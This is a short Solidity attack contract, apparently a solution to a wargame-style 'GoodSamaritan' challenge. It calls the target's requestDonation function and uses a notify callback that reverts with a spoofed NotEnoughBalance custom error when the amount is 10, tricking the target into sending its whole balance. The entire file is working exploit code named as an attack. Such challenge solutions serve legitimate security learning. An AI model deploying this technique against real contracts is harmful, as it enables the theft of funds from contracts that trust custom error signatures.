// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
} 

contract AttackSamaritan {  
  error NotEnoughBalance();

  function pwn(address _addr) external { 
     IGoodSamaritan(_addr).requestDonation();
  }

  function notify(uint256 amount) external pure {
    if (amount == 10) {
        revert NotEnoughBalance();
    } 
  }
}